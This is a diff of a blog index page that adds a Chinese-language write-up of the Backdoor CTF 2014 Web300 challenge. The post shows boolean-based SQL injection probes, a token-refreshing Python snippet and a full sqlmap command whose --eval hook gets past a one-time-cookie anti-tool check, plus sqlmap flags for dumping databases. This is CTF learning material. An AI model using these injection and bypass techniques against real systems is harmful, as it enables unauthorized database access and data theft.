@@ -9,12 +9,7 @@
   <meta name="author" content="cychao">
 
   
-  <meta name="description" content="感冒在家養病逛fb, 突然看到有ctf可以打 馬上開skype問帳號開打XD 直接找一題沒人解的來玩 下載檔案可以看到疑似封包內容的 in out stream 1
-2
-3
-4
-5
-stream = [(&#39;in&#39;, b&#39;\x00\x00\x00T\xffSMBr\x00\ &hellip;">
+  <meta name="description" content="這次CTF不難 早上11:00開始玩到晚上12:00時已經差三題全解 後來 Orange 出手成績直接爆表 有趣的是主辦單位在規則上寫說: The competition requires you to find flags to gain points. Some flags can be &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -70,6 +65,174 @@ stream = [(&#39;in&#39;, b&#39;\x00\x00\x00T\xffSMBr\x00\ &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/03/23/backdoor-ctf-2014-web300-write-up/">Backdoor CTF 2014 Web300 Write-up</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-03-23T13:47:44+08:00" pubdate data-updated="true">Mar 23<span>rd</span>, 2014</time>
+        
+           | <a href="/blog/2014/03/23/backdoor-ctf-2014-web300-write-up/#disqus_thread"
+             data-disqus-identifier="http://jeffxx.github.io/blog/2014/03/23/backdoor-ctf-2014-web300-write-up/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>這次CTF不難  早上11:00開始玩到晚上12:00時已經差三題全解</p>
+
+<p>後來 Orange 出手成績直接爆表</p>
+
+<p><img src="/images/writeup/backdoor2014_scoreboard.PNG"></p>
+
+<p>有趣的是主辦單位在規則上寫說:</p>
+
+<blockquote><p>The competition requires you to find flags to gain points. Some flags can be gained by completing tasks, others are hidden in different places.</p></blockquote>
+
+<p>這不是讓大家去打網站嗎OTZ</p>
+
+<p>當時整個網頁都翻過之後才看到IRC上說hidden flag總共四把</p>
+
+<p><em>其實我很想寫第五把hidden flag的write up</em></p>
+
+<p>所有題目裡,值得記錄下來的是web300</p>
+
+<p>直接看題目</p>
+
+<blockquote><p>H4x0r is making a new website and has decided to give you beta access! Head over here to register.</p></blockquote>
+
+<p>網頁連進去後有register, status, login三個頁面</p>
+
+<p><img src="/images/writeup/backdoor2014_w300_register.PNG"></p>
+
+<p><img src="/images/writeup/backdoor2014_w300_status.PNG"></p>
+
+<p>其中有問題的是 status.php</p>
+
+<p>輸入存在的使用者會</p>
+
+<p><img src="/images/writeup/backdoor2014_w300_status_valid.PNG"></p>
+
+<p>不存在時</p>
+
+<p><img src="/images/writeup/backdoor2014_w300_invalid.PNG"></p>
+
+<p>這個頁面存在 boolean-based sql injection  簡單用一對一錯的sql injection試一下就知道</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="s1">&#39; or 1=&#39;</span><span class="mi">1</span>
+</span><span class='line'><span class="s1">&#39; and 2=&#39;</span><span class="mi">1</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>知道是boolean-based的sql injection 直接拿sql map出來跑</p>
+
+<p>這邊一定要提一下Atdog前面解w100時(也是bool sql injection)靠北了一句話</p>
+
+<blockquote><p>我還是第一次看到ctf的題目 sqlmap可以直接爆的</p></blockquote>
+
+<p>不過這題是三百分,有擋工具 如果使用工具的話會被偵測出來</p>
+
+<p><img src="/images/writeup/backdoor2014_w300_status_block.PNG"></p>
+
+<p>在這邊就做了一些猜測,  是檢查 user-agent? IP bind cookie? frequency rate?</p>
+
+<p>最後發現status頁面會 set cookie,  post過去的頁面會delete cookie.</p>
+
+<p>cookie只能用一次,且鎖php session</p>
+
+<p>這時就會發現SQLmap真的很強大, 可以自訂每次request 前執行的動作 修改每次的cookie parameter</p>
+
+<p><img src="/images/writeup/backdoor2014_sqlmap_eval_usage.PNG"></p>
+
+<p>而eval修改cookie的功能是去年加上去的</p>
+
+<p><img src="/images/writeup/backdoor2014_sqlmap_not_suppot_cookie.PNG"></p>
+
+<p><img src="/images/writeup/backdoor2014_sqlmap_eval_cookies.PNG"></p>
+
+<p>最後就是用sqlmap eval 去讀status.php取得cookie  就可以爆db了</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span><span class="p">;</span>
+</span><span class='line'><span class="n">web_300_token</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;http://backdoor.cognizance.org.in/problems/web300/status.php&#39;</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s">&#39;SQLI&#39;</span><span class="p">},</span><span class="n">cookies</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">PHPSESSID</span><span class="o">=</span><span class="s">&#39;s60g4fnru4scvr8agl7rvnaji4&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">&#39;web_300_token&#39;</span><span class="p">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>值得注意的是sqlmap跟status要用同一組php session key 不然還是會錯.</p>
+
+<p>Payload</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">sqlmap -u http://backdoor.cognizance.org.in/problems/web300/check.php \</span>
+</span><span class='line'><span class="go">           --data=&quot;username=a&quot; --string=&quot;This user has been validated&quot;\</span>
+</span><span class='line'><span class="go">           --cookie=&quot;web_300_token=25b71a45869d38c2a509116149245865;  \</span>
+</span><span class='line'><span class="go">           PHPSESSID=s60g4fnru4scvr8agl7rvnaji4&quot; \</span>
+</span><span class='line'><span class="go">           --user-agent=&quot;SQLI&quot; \</span>
+</span><span class='line'><span class="go">           --referer=&quot;http://backdoor.cognizance.org.in/problems/web300/status.php&quot; \</span>
+</span><span class='line'><span class="go">           --eval=&quot;import requests;\</span>
+</span><span class='line'><span class="go">                   web_300_token=requests.get(&#39;http://backdoor.cognizance.org.in/problems/web300/status.php&#39;,\</span>
+</span><span class='line'><span class="go">                   headers={&#39;User-Agent&#39;: &#39;SQLI&#39;},\</span>
+</span><span class='line'><span class="go">                   cookies=dict(PHPSESSID=&#39;s60g4fnru4scvr8agl7rvnaji4&#39;)).cookies[&#39;web_300_token&#39;]&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>相關參數
+-u url
+&mdash;data Post的資料
+&mdash;string SQL指令執行是true web會回傳的關鍵字
+&mdash;not-string SQL指令執行是false web會回傳的關鍵字
+&mdash;cookie 指定cookie
+&mdash;user-agent 指定user agent
+&mdash;referer 指定ref page
+&mdash;eval 每次request前須執行的指令</p>
+
+<p>撈資料
+&mdash;users 撈db帳號
+&mdash;databases 撈db
+&mdash;tables 撈table , 可用-D 指定database
+&mdash;columns 撈欄位 , 可用-T 指定table
+&mdash;dump 撈資料, 要用-C 指定欄位 -T 指定table
+&mdash;dump-all 撈所有資料 再bool-based底下會很慢</p>
+
+<hr />
+
+<p>&mdash;threads 指定同時run幾隻 加快速度</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -381,6 +544,10 @@ stream = [(&#39;in&#39;, b&#39;\x00\x00\x00T\xffSMBr\x00\ &hellip;">
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/03/23/backdoor-ctf-2014-web300-write-up/">Backdoor CTF 2014 Web300 Write-up</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2014/03/14/bctf-misc300-write-up/">BCTF Misc300 Write Up</a>
